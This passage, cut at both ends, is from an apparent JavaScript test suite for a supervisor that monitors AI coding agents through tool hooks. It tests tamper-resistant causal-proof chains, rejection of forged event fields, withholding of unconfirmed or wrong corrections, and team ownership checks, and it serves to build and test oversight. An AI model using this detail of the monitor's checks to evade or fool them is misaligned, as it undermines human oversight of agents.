  assert.equal(proof.complete, false);
  assert.match(proof.errors.join(" "), /more than one runId/);
});

test("causal proof requires one hash-bound ordered chain through intervention resolution", () => {
  const h = harness();
  const first = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(first.output.decision, "block");
  applyObservedCorrection(h);
  const second = h.controller.stop({ input: {
    hook_event_name: "Stop", stop_hook_active: true, transcript_path: h.transcript,
  } });
  assert.equal(second.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  let events = h.store.events();

  const unresolved = events.map((event) => event.type === "intervention_resolved"
    ? { ...event, type: "intervention_resolution_missing" } : { ...event });
  const missingProof = validateCausalProof(unresolved);
  assert.equal(missingProof.complete, false);
  assert.match(missingProof.errors.join(" "), /no intervention has a complete causal chain/);

  const moved = events.map((event) => ({ ...event }));
  const effectIndex = moved.findIndex((event) => event.type === "effect_observed");
  const [effect] = moved.splice(effectIndex, 1);
  const acceptanceIndex = moved.findIndex((event) => event.type === "acceptance_finished"
    && event.phase === "stop" && event.passed === true);
  moved.splice(acceptanceIndex + 1, 0, effect);
  moved.forEach((event, index) => { event.seq = index + 1; });
  const outOfOrderProof = validateCausalProof(moved);
  assert.equal(outOfOrderProof.complete, false);
  assert.match(outOfOrderProof.errors.join(" "), /no intervention has a complete causal chain/);

  const substituted = events.map((event) => event.type === "effect_observed"
    ? { ...event, correctionAuthorityHash: "sha256:substituted-after-audit" } : { ...event });
  const substitutionProof = validateCausalProof(substituted);
  assert.equal(substitutionProof.complete, false);
  assert.match(substitutionProof.errors.join(" "), /no intervention has a complete causal chain/);

  const unmatched = events.map((event) => event.type === "effect_observed"
    ? { ...event, matchedExpectedAction: null } : { ...event });
  const unmatchedProof = validateCausalProof(unmatched);
  assert.equal(unmatchedProof.complete, false);
  assert.match(unmatchedProof.errors.join(" "), /no intervention has a complete causal chain/);

  const stale = events.map((event) => event.type === "effect_observed"
    ? { ...event, artifactFingerprint: `sha256:${"0".repeat(64)}` } : { ...event });
  const staleProof = validateCausalProof(stale);
  assert.equal(staleProof.complete, false);
  assert.match(staleProof.errors.join(" "), /no intervention has a complete causal chain/);
});

test("event payloads cannot forge run identity, sequence, type, or contract seal", () => {
  const h = harness();
  const prior = h.store.events().length;
  const event = h.store.append("real_type", {
    runId: "forged-run",
    seq: 999,
    type: "forged_type",
    contractSeal: "forged-seal",
  });
  assert.equal(event.runId, h.store.runId);
  assert.equal(event.seq, prior + 1);
  assert.equal(event.type, "real_type");
  assert.equal(event.contractSeal, h.store.contract.seal);
});

test("a correct first-pass delivery succeeds without manufacturing an intervention", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({ acceptanceResults: [green, green] });
  const stop = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(stop.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  assert.equal(finished.proof.interventionRequired, false);
  assert.equal(finished.proof.interventionComplete, true);
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
  assert.equal(h.store.readState().agents.main.status, "completed");
  const events = h.store.events();
  const finalAcceptance = [...events].reverse().find((event) => event.type === "acceptance_finished"
    && event.phase === "final");
  const semantic = [...events].reverse().find((event) => event.type === "outcome_verdict"
    && event.passed === true);
  assert.equal(finalAcceptance.finalFingerprint, semantic.finalFingerprint,
    "normal completion binds mechanical and semantic PASS to one artifact");
});

test("proof cannot reuse a Stop PASS after the final artifact fingerprint changes", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  let verifierCalls = 0;
  const h = harness({
    acceptanceResults: [green, green],
    verifierHandler: () => {
      verifierCalls += 1;
      if (verifierCalls === 1) return { ok: true, verdict: {
        passed: true, gaps: [], evidence: ["Stop artifact independently passed"],
      } };
      return { ok: false, error: "final artifact judge unavailable",
        failure: { kind: "process", retryable: false } };
    },
  });
  const stop = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stop.output.decision, "approve");
  const stopOutcome = h.store.events().find((event) => event.type === "outcome_verdict"
    && event.passed === true);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 999;\n");
  const finished = h.controller.finish();
  const finalAcceptance = [...h.store.events()].reverse().find((event) =>
    event.type === "acceptance_finished" && event.phase === "final");
  assert.notEqual(finalAcceptance.finalFingerprint, stopOutcome.finalFingerprint);
  assert.equal(finished.proof.complete, false);
  assert.equal(finished.proof.deliveryComplete, false);
  assert.match(finished.proof.errors.join("; "), /semantic outcome verification/);
});

test("a later explicit reject for the same fingerprint overrides an older PASS", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  let verifierCalls = 0;
  const h = harness({
    acceptanceResults: [green, green],
    verifierHandler: () => {
      verifierCalls += 1;
      if (verifierCalls === 1) return { ok: true, verdict: {
        passed: true, gaps: [], evidence: ["initial review passed"],
      } };
      return { ok: false, error: "fresh review unavailable",
        failure: { kind: "process", retryable: false } };
    },
  });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const first = h.store.events().find((event) => event.type === "outcome_verdict"
    && event.passed === true);
  h.store.append("outcome_verdict", {
    interventionId: first.interventionId,
    phase: "stop",
    finalFingerprint: first.finalFingerprint,
    passed: false,
    verifierProposedPassed: false,
    gaps: ["later independent review found a counterexample"],
    evidence: [],
    insufficient: null,
  });
  const finished = h.controller.finish();
  assert.equal(verifierCalls, 1,
    "the later same-fingerprint RED is authoritative and is not resampled");
  assert.equal(h.store.events().some((event) => event.type === "outcome_verification_reused"), false);
  assert.ok(h.store.events().some((event) => event.type === "outcome_conflict_sticky_red"
    && event.sourceOutcomeVerdictSeq > first.seq));
  assert.equal(finished.proof.complete, false);
  assert.match(finished.proof.errors.join("; "), /semantic outcome verification/);
});

test("a mechanical drift signal cleared by semantics never reaches the worker", () => {
  let calls = 0;
  const h = harness({
    decide: () => ({
      verdict: "warn",
      reason: "third repeated failure: stop and edit another file",
      corrective: "mechanical text must stay private",
      proposed: { action: "Edit(src/value.js)", file: "src/value.js",
        isEdit: true, irreversible: false },
    }),
    acceptanceResults: [{ ran: true, passed: false, exit: 1,
      command: "npm test", output: "expected baseline failure" }],
    supervisorHandler: () => {
      calls += 1;
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [],
        expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "expected red before edit" } };
    },
  });
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "first-edit",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(calls, 1);
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(Object.hasOwn(result.output.hookSpecificOutput, "additionalContext"), false);
  assert.doesNotMatch(JSON.stringify(result.output), /third repeated failure|mechanical text/);
  const withheld = h.store.events().find((event) => event.type === "mechanical_signal_withheld");
  assert.equal(withheld.semanticStatus, "on-track");
  assert.equal(withheld.resolution, "semantic-clearance");
  assert.equal(withheld.messageDelivered, false);
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
  assert.ok(h.store.events().some((event) => event.type === "supervisor_clearance_audit"
    && event.passed === true));
});

test("same-boundary semantic clearance prevents a duplicate mechanical supervisor call", () => {
  let calls = 0;
  let decisions = 0;
  const h = harness({
    semanticPatrolEvery: 2,
    semanticPatrolMinEvidenceSteps: 0,
    decide: () => {
      decisions += 1;
      return decisions === 1
        ? { verdict: "allow", proposed: { action: "Read(src/value.js)", irreversible: false } }
        : { verdict: "warn", reason: "mechanical hypothesis", corrective: "do not deliver",
          proposed: { action: "Edit(src/value.js)", file: "src/value.js",
            isEdit: true, irreversible: false } };
    },
    supervisorHandler: () => {
      calls += 1;
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [],
        expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "low" } };
    },
  });
  h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: "read-1",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "edit-1",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(calls, 1, "the patrol verdict already covers this proposed Edit");
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(h.store.events().filter((event) => event.type === "supervisor_requested").length, 1);
  assert.equal(h.store.events().some((event) => event.type === "diagnostic_acceptance"), false);
  const withheld = h.store.events().find((event) => event.type === "mechanical_signal_withheld");
  assert.equal(withheld.resolution, "same-boundary-semantic-clearance");
  assert.equal(withheld.messageDelivered, false);
});

test("completion-claim telemetry cannot seize a PreToolUse boundary while the worker is still acting", () => {
  let supervisorCalls = 0;
  let acceptanceCalls = 0;
  const h = harness({
    decide: () => ({
      verdict: "warn",
      reason: "claims-done-but-no-change: task slice is completed while the run continues",
      corrective: "reopen the completed task",
      proposed: { action: "npm run checkpoint -- next", isEdit: false, irreversible: false },
    }),
    acceptanceResults: [{ ran: true, passed: false, exit: 1,
      command: "npm test", output: "time witness is not old enough" }],
    supervisorHandler: () => {
      supervisorCalls += 1;
      return { ok: true, verdict: { onTrack: false, drift: "wrong", plan: ["reopen task"],
        expectedNextActions: ["run:checkpoint"], acceptanceRisk: "red" } };
    },
  });
  const originalAcceptance = h.controller.acceptance;
  h.controller.acceptance = (...args) => {
    acceptanceCalls += 1;
    return originalAcceptance(...args);
  };
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "checkpoint-after-slice",
    tool_input: { command: "npm run checkpoint -- next" }, transcript_path: h.transcript,
  } });
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(supervisorCalls, 0);
  assert.equal(acceptanceCalls, 0,
    "frozen completion acceptance belongs to Stop, not an ordinary checkpoint boundary");
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
  assert.ok(h.store.events().some((event) => event.type === "mechanical_signal_withheld"
    && event.resolution === "pretool-boundary-is-not-completion-boundary"
    && event.messageDelivered === false));
});

test("token-waste telemetry cannot block its own edit reset or cross-contaminate Team actors", () => {
  let supervisorCalls = 0;
  let proposed = { action: "edit", isEdit: true, irreversible: false };
  const h = harness({
    decide: () => ({ verdict: "warn", reason: "repeated-action: pooled reads",
      corrective: "stop repeating and make progress", proposed }),
    supervisorHandler: () => {
      supervisorCalls += 1;
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [],
        expectedNextActions: [], acceptanceRisk: "low" } };
    },
  });
  const edit = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Write", tool_use_id: "loop-reset-edit",
    tool_input: { file_path: "src/value.js", content: "export const value = 2;\n" },
    transcript_path: h.transcript,
  } });
  assert.equal(edit.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(supervisorCalls, 0);
  assert.ok(h.store.events().some((event) => event.type === "mechanical_signal_withheld"
    && event.resolution === "proposed-edit-resets-token-waste-loop"));

  h.store.saveState({ teamIdentityBindings: {
    "sha256:team-member": { bindingHash: "sha256:binding", canonicalAgentId: "teammate:alice" },
  } });
  proposed = { action: "read", isEdit: false, irreversible: false };
  const pooled = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "ToolSearch", tool_use_id: "pooled-team-read",
    tool_input: { query: "select:Read" }, transcript_path: h.transcript,
  } });
  assert.equal(pooled.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(supervisorCalls, 0);
  assert.ok(h.store.events().some((event) => event.type === "mechanical_signal_withheld"
    && event.resolution === "multi-agent-trajectory-not-actor-separable"));
});

test("a controller-dispatched bounded shift cannot be reclassified as token-waste drift", () => {
  let supervisorCalls = 0;
  const h = harness({
    decide: () => ({ verdict: "warn", reason: "repeated-action: repeated npm test",
      corrective: "do something else", proposed: { action: "npm test", isEdit: false,
        irreversible: false } }),
    supervisorHandler: () => { supervisorCalls += 1; return { ok: false, error: "not expected" }; },
  });
  const dispatch = h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 2, afterApprovedStopSeq: 10,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "checkpoint", ordinal: 2, dispatchedAtSeq: dispatch.seq,
  });
  const testRun = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "shift-test",
    tool_input: { command: "npm test" }, transcript_path: h.transcript,
  } });
  assert.equal(testRun.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(supervisorCalls, 0);
  const withheld = h.store.events().filter((event) => event.type === "mechanical_signal_withheld"
    && event.resolution === "controller-dispatched-bounded-shift");
  assert.equal(withheld.length, 1);
  assert.ok(withheld.every((event) => event.shiftKind === "checkpoint"
    && event.shiftDispatchSeq === dispatch.seq));

  h.store.append("endurance_shift_completed", { kind: "checkpoint", ordinal: 2,
    dispatchedAtSeq: dispatch.seq });
  h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "outside-shift",
    tool_input: { command: "npm test" }, transcript_path: h.transcript,
  } });
  assert.equal(supervisorCalls, 1, "the exception ends with the completed evaluator shift");
});

test("semantic supervisor prompt treats an active evaluator shift as required evidence", () => {
  assert.match(SUPERVISOR_PROMPT,
    /尚未出现对应\s*\n?endurance_shift_completed 的有限班次/);
  assert.match(SUPERVISOR_PROMPT,
    /不得把 evaluator 为取证而派发的动作反过来当成 worker 偏航证据/);
});

test("a candidate correction does not require an earlier intervention to authorize itself", () => {
  assert.match(SUPERVISOR_PROMPT, /没有更早的 OUTSIDER_INTERVENTION 是正常的/);
  assert.match(SUPERVISOR_PROMPT, /不得要求一个更早的干预先授权当前候选干预/);
  assert.match(SUPERVISOR_PROMPT, /task:create:<owner>/);
  assert.match(SUPERVISOR_PROMPT, /teammate:spawn:<name>/);
  assert.match(CORRECTION_AUDIT_PROMPT, /当前 proposedCorrection 正是待授权的候选纠正/);
  assert.match(CORRECTION_AUDIT_PROMPT, /不存在更早的 OUTSIDER_INTERVENTION 是正常的/);
});

test("an Agent Team correction keeps task graph, teammate spawn, and actor ownership authoritative", () => {
  const policy = {
    schema: "outsider/agent-team-policy/v1",
    enforceExclusiveSliceOwnership: true,
    requireDelegationBinding: true,
    requiredTeammates: ["store-owner"],
    requiredAgentModel: "sonnet",
    expectedFilesByTeammate: { "store-owner": "src/value.js" },
  };
  const evidence = {
    currentSourceEvidence: [{ path: "src/value.js", sha256: `sha256:${"a".repeat(64)}` }],
    semanticOutcome: { passed: false, gaps: ["the named owner has not implemented its slice"] },
    frozenAcceptanceDefinition: { files: [] },
  };
  const authority = correctionAuthorityFrom({
    contract: { acceptance: "npm test", semantic: { scope: { in: ["src/value.js"], out: [] } } },
    cwd: "/repo", evidence, actorId: "main", agentTeamPolicy: policy,
    verdict: {
      onTrack: false, drift: "the team graph was skipped",
      plan: ["create the shared task, spawn store-owner, and let that owner implement its slice"],
      expectedNextActions: ["edit:src/value.js", "run:acceptance"],
    },
  });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.equal(authority.schema, "outsider/correction-authority/v2");
  assert.deepEqual(authority.expectedActions.map((action) => [action.kind, action.actor]), [
    ["ensureTask", "main"],
    ["spawnTeammate", "main"],
    ["edit", "teammate:store-owner"],
    ["runRef", "main"],
    ["semanticReverify", "main"],
  ]);
  assert.match(authority.repairInstructions.join("\n"), /不得用 main 代写 teammate/u);

  const h = harness({ agentTeamPolicy: policy, outcomeVerdict: {
    passed: false, gaps: ["the named owner has not implemented its slice"], evidence: [],
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const emitted = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(emitted);
  assert.deepEqual(emitted.expectedActions.filter((action) => action.kind === "edit")
    .map((action) => action.actor), ["teammate:store-owner"]);
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: emitted.marker } })}\n`);
  const blocked = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "main-steals-slice",
    tool_input: { file_path: "src/value.js", old_string: "1", new_string: "2" },
    transcript_path: h.transcript,
  } });
  assert.equal(blocked.decision.verdict, "deny");
  assert.match(blocked.output.hookSpecificOutput.permissionDecisionReason,
    /teammate:store-owner|无权代写/u);
  assert.ok(h.store.events().some((event) =>
    ["correction_actor_authority_blocked", "team_slice_ownership_blocked"].includes(event.type)));
});

test("a later team correction never reopens completed slices or respawns their owners", () => {
  const policy = {
    schema: "outsider/agent-team-policy/v1",
    requiredTeammates: ["store-owner", "scheduler-owner"],
    requiredAgentModel: "sonnet",
    expectedFilesByTeammate: {
      "store-owner": "src/store.js",
      "scheduler-owner": "src/scheduler.js",
    },
    expectedFilesByLead: ["src/recovery.js", "src/index.js"],
  };
  const evidence = {
    currentSourceEvidence: [{ path: "src/index.js", sha256: `sha256:${"b".repeat(64)}` }],
    semanticOutcome: { passed: false, gaps: ["complete() accepts an expired lease"] },
    frozenAcceptanceDefinition: { files: [] },
    coordination: { tasks: [
      { id: "1", kind: "team", subject: "Implement src/store.js",
        owner: "store-owner", status: "completed", independentlyVerified: true,
        blockedBy: [], touchedFiles: ["src/store.js"] },
      { id: "2", kind: "team", subject: "Implement src/scheduler.js",
        owner: "scheduler-owner", status: "completed", independentlyVerified: true,
        blockedBy: [], touchedFiles: ["src/scheduler.js"] },
      { id: "3", kind: "team", subject: "Integrate recovery and the public API",
        description: "Implement src/recovery.js and src/index.js after both owned slices complete",
        owner: "lead", status: "awaiting-host-completion-post", independentlyVerified: false,
        blockedBy: ["1", "2"], touchedFiles: [] },
    ] },
    controllerProcessEvidence: [
      { type: "teammate_context_injected", agentId: "teammate:store-owner" },
      { type: "teammate_context_injected", agentId: "teammate:scheduler-owner" },
    ],
  };
  const authority = correctionAuthorityFrom({
    contract: { acceptance: "npm test", semantic: { scope: { in: ["src/**"], out: [] } } },
    cwd: "/repo", evidence, actorId: "main", agentTeamPolicy: policy,
    verdict: {
      onTrack: false,
      drift: "complete() does not recompute lease expiry",
      plan: ["recompute expiry before allowing completion"],
      expectedNextActions: ["edit:src/index.js", "run:acceptance"],
    },
  });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.expectedActions.map((action) => [action.kind, action.actor]), [
    ["edit", "main"],
    ["runRef", "main"],
    ["semanticReverify", "main"],
  ]);
  assert.equal(authority.expectedActions.some((action) =>
    ["ensureTask", "spawnTeammate"].includes(action.kind)), false);
  assert.doesNotMatch(authority.repairInstructions.join("\n"), /建立并分配冻结的共享任务图/u);
});

test("equivalent projected probe actions are deduplicated before correction audit", () => {
  const evidence = {
    currentSourceEvidence: [{ path: "src/value.js", sha256: `sha256:${"a".repeat(64)}` }],
    semanticOutcome: { passed: false, gaps: ["both owned slice checks are still missing"] },
    frozenAcceptanceDefinition: { files: [] },
  };
  const authority = correctionAuthorityFrom({
    contract: { acceptance: "npm test", semantic: { scope: { in: ["src/value.js"], out: [] } } },
    cwd: "/repo", evidence,
    verdict: { onTrack: false, drift: "checks missing", plan: ["run both checks"],
      expectedNextActions: ["edit:src/value.js", "run:test:store", "run:test:scheduler",
        "run:acceptance"] },
  });
  assert.equal(authority.expectedActions.filter((action) =>
    action.kind === "probeRequest").length, 1);
});

test("active evaluator shift exposes current progress without calling future steps omissions", () => {
  const cwd = "/tmp/outsider-active-shift";
  const preregistration = { shiftPolicy: { patrolWarmup: { checks: [
    "read:src/store.js", "read:src/scheduler.js", "run:npm test",
  ] } } };
  const events = [
    { seq: 10, type: "endurance_patrol_warmup_dispatched", kind: "patrol-warmup" },
    { seq: 11, type: "endurance_shift_input_submitted", kind: "patrol-warmup",
      dispatchedAtSeq: 10 },
  ];
  const first = activeControllerShiftEvidence(events, {
    cwd, preregistration, toolName: "Read",
    toolInput: { file_path: `${cwd}/src/store.js` },
  });
  assert.deepEqual(first, {
    authority: "controller-derived-from-sealed-event-order-and-preregistration",
    kind: "patrol-warmup",
    dispatchSeq: 10,
    submittedSeq: 11,
    phase: "in-progress",
    expectedSteps: ["read:src/store.js", "read:src/scheduler.js", "run:npm test"],
    completedSteps: [],
    completedStepCount: 0,
    completedBoundaryCount: 0,
    unexpectedCompletedActionCount: 0,
    allCompletedSuccessfully: false,
    totalStepCount: 3,
    proposedStep: "read:src/store.js",
    expectedNextStep: "read:src/store.js",
    proposedMatchesNext: true,
    allExpectedCompleted: false,
    futureStepsAreNotCurrentOmissions: true,
  });
  events.push({ seq: 12, type: "boundary_reached", boundary: "PostToolUse", tool: "Read",
    file: `${cwd}/src/store.js`, action: `Read(${cwd}/src/store.js)` });
  const second = activeControllerShiftEvidence(events, {
    cwd, preregistration, toolName: "Read",
    toolInput: { file_path: `${cwd}/src/scheduler.js` },
  });
  assert.equal(second.completedStepCount, 1);
  assert.equal(second.expectedNextStep, "read:src/scheduler.js");
  assert.equal(second.proposedMatchesNext, true);
  events.push({ seq: 13, type: "endurance_shift_completed", dispatchedAtSeq: 10 });
  assert.equal(activeControllerShiftEvidence(events, { cwd, preregistration }), null,
    "a completed warmup is no longer an active mechanical or semantic exception");
});

test("active checkpoint normalizes only the exact frozen-workspace cd wrapper", () => {
  const cwd = "/tmp/outsider active shift";
  const preregistration = { shiftPolicy: { checks: [
    "read:src/value.js", "run:npm test", "run:npm run checkpoint -- phase-2",
  ] } };
  const base = [
    { seq: 1, type: "endurance_shift_dispatched", kind: "checkpoint", ordinal: 2 },
    { seq: 2, type: "endurance_shift_input_submitted", kind: "checkpoint",
      dispatchedAtSeq: 1 },
    { seq: 3, type: "boundary_reached", boundary: "PostToolUse", tool: "Read",
      file: `${cwd}/src/value.js`, action: `Read(${cwd}/src/value.js)`, exit: 0 },
    { seq: 4, type: "boundary_reached", boundary: "PostToolUse", tool: "Bash",
      action: `cd ${JSON.stringify(cwd)} && npm test`, exit: 0 },
    { seq: 5, type: "boundary_reached", boundary: "PostToolUse", tool: "Bash",
      action: `cd ${JSON.stringify(cwd)} && npm run checkpoint -- phase-2`, exit: 0 },
  ];
  const exact = activeControllerShiftEvidence(base, { cwd, preregistration });
  assert.equal(exact.allExpectedCompleted, true);
  assert.deepEqual(exact.completedSteps, preregistration.shiftPolicy.checks);

  const wrongCwd = structuredClone(base);
  wrongCwd[3].action = "cd \"/tmp/other\" && npm test";
  const rejected = activeControllerShiftEvidence(wrongCwd, { cwd, preregistration });
  assert.equal(rejected.allExpectedCompleted, false);
  assert.equal(rejected.completedSteps[1], "run:cd \"/tmp/other\" && npm test");
});

test("diagnosis and clearance audit receive the same active-shift temporal fact", () => {
  const h = harness();
  h.store.writeJson("endurance-preregistration.json", { shiftPolicy: { patrolWarmup: { checks: [
    "read:src/value.js", "run:npm test",
  ] } } });
  const dispatch = h.store.append("endurance_patrol_warmup_dispatched", {
    kind: "patrol-warmup", afterApprovedStopSeq: 20,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "patrol-warmup", dispatchedAtSeq: dispatch.seq,
  });
  const evidence = h.controller.evidence({
    input: { transcript_path: h.transcript },
    agent: "claude-code",
    trigger: "patrol:periodic-semantic-checkpoint",
    proposedTool: { name: "Read", input: { file_path: path.join(h.cwd, "src/value.js") } },
  });
  assert.equal(evidence.packet.activeEvaluatorShift.phase, "in-progress");
  assert.equal(evidence.packet.activeEvaluatorShift.proposedStep, "read:src/value.js");
  assert.equal(evidence.packet.activeEvaluatorShift.proposedMatchesNext, true);
  let auditInput = "";
  const clearance = auditSupervisorClearance({
    cmd: "fake",
    contract: h.store.contract,
    evidence: evidence.packet,
    proposal: { onTrack: true, drift: "", plan: [], expectedNextActions: [] },
    execute: ({ input }) => {
      auditInput = input;
      return { ok: true, value: { decision: "pass", blockingErrors: [], notes: [],
        verifiedFacts: ["current proposed step matches the active shift"],
        insufficientReason: null } };
    },
  });
  assert.equal(clearance.verdict.passed, true);
  assert.match(auditInput, /futureStepsAreNotCurrentOmissions/);
  assert.match(auditInput, /read:src\/value\.js/);
});

test("TaskUpdate semantic patrol evidence carries the deterministic addBlocks direction", () => {
  const h = harness();
  h.store.saveState({ tasks: {
    store: { id: "store", kind: "team", owner: "store-owner", status: "pending",
      blockedBy: [] },
    scheduler: { id: "scheduler", kind: "team", owner: "scheduler-owner",
      status: "pending", blockedBy: [] },
    integration: { id: "integration", kind: "team", owner: "lead", status: "pending",
      blockedBy: ["store"] },
  } });
  const evidence = h.controller.evidence({
    input: { transcript_path: h.transcript },
    agent: "claude-code",
    trigger: "periodic-semantic-patrol:16",
    actor: { agentId: "main" },
    proposedTool: { name: "TaskUpdate", input: {
      taskId: "scheduler", addBlocks: ["integration"],
    } },
  });
  assert.equal(evidence.packet.proposedToolSemantics.authority,
    "deterministic-controller-preview");
  assert.equal(evidence.packet.proposedToolSemantics.ok, true);
  assert.match(evidence.packet.proposedToolSemantics.addBlocksMeaning,
    /downstream|depends on the current task/u);
  const integration = evidence.packet.proposedToolSemantics.resultingTasks
    .find((task) => task.id === "integration");
  assert.deepEqual(integration.blockedBy, ["store", "scheduler"],
    "the supervisor sees the host's actual dependency direction, not a guess from the field name");
});

test("an in-progress controller shift is continued before acceptance or semantic repair", () => {
  const h = harness({ acceptanceResults: [{ ran: true, passed: false, exit: 1,
    command: "npm test", output: "the recovery marker still exists" }] });
  h.store.writeJson("endurance-preregistration.json", { shiftPolicy: { checks: [
    "read:src/value.js", "run:npm test",
  ] } });
  const dispatched = h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 1,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "checkpoint", ordinal: 1, dispatchedAtSeq: dispatched.seq,
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /read:src\/value\.js/);
  assert.equal(h.store.events().some((event) => event.type === "acceptance_finished"), false,
    "an expected intermediate red state is not sent through outcome diagnosis");
  assert.equal(h.store.events().some((event) => event.type === "supervisor_requested"), false);
  const continuation = h.store.events().find((event) =>
    event.type === "endurance_shift_continuation_emitted");
  assert.equal(continuation.expectedNextStep, "read:src/value.js");
  assert.equal(continuation.modelCallUsed, false);
});

test("an unconfirmed mechanical hypothesis is recorded but never injected", () => {
  const h = harness({
    decide: () => ({ verdict: "warn", reason: "untrusted sensor accusation",
      corrective: "untrusted sensor instruction",
      proposed: { action: "Edit(src/value.js)", file: "src/value.js",
        isEdit: true, irreversible: false } }),
    acceptanceResults: [{ ran: true, passed: false, exit: 1,
      command: "npm test", output: "red" }],
    supervisorHandler: () => ({ ok: false, error: "permanent supervisor failure",
      failure: { kind: "process", status: 2, retryable: false } }),
  });
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "edit-unconfirmed",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  assert.doesNotMatch(JSON.stringify(result.output), /untrusted sensor/);
  const withheld = h.store.events().find((event) => event.type === "mechanical_signal_withheld");
  assert.equal(withheld.semanticStatus, "failed");
  assert.equal(withheld.resolution, "unconfirmed");
  assert.equal(withheld.messageDelivered, false);
  assert.ok(h.store.events().some((event) => event.type === "supervisor_failed"));
});

test("a factually wrong semantic correction is withheld before it reaches the worker", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "red" };
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "window (-950,50] contains 0,100,50",
      plan: ["rewrite around that counterexample"],
      expectedNextActions: ["edit:src/value.js"],
      acceptanceRisk: "red",
    } }),
    correctionAuditorHandler: (options) => {
      assert.match(options.proposal.defect.claims.join(" "), /-950,50/);
      assert.equal(options.evidence.currentSourceEvidence[0].path, "src/value.js",
        "the correction auditor can recompute source claims from controller-captured bytes");
      assert.match(options.evidence.currentSourceEvidence[0].content, /value = 1/);
      return { ok: true, packet: { proposal: options.proposal }, verdict: {
        passed: false,
        errors: ["100 is greater than 50 and is not in (-950,50]"],
        verifiedFacts: ["only 0 is in the claimed window"],
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block", "red acceptance still keeps the worker alive");
  assert.doesNotMatch(stopped.output.reason, /window \(-950,50\] contains/,
    "the rejected factual claim is not injected into the worker");
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "correction_factual_audit"
    && event.passed === false && event.errors[0].includes("100")));
  assert.ok(events.some((event) => event.type === "correction_withheld_factual_error"
    && event.messageDelivered === false));
  assert.equal(events.some((event) => event.type === "correction_emitted"), false);
  const reliability = supervisorReliability(events);
  assert.equal(reliability.correctionFactualErrorRate, 1);
  assert.equal(reliability.correctionsDelivered, 0);
});

test("a mandatory audited-repair run never converts a rejected correction into mechanical repair authority", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "AssertionError: .outsider-endurance-drift must be removed" };
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "the evaluator-owned marker keeps frozen acceptance red",
      plan: ["remove it"],
      expectedNextActions: ["edit:src/value.js", "run:acceptance"],
      acceptanceRisk: "red",
    } }),
    correctionAuditorHandler: () => ({ ok: true, verdict: {
      passed: false, errors: ["the proposed edit does not repair the marker defect"],
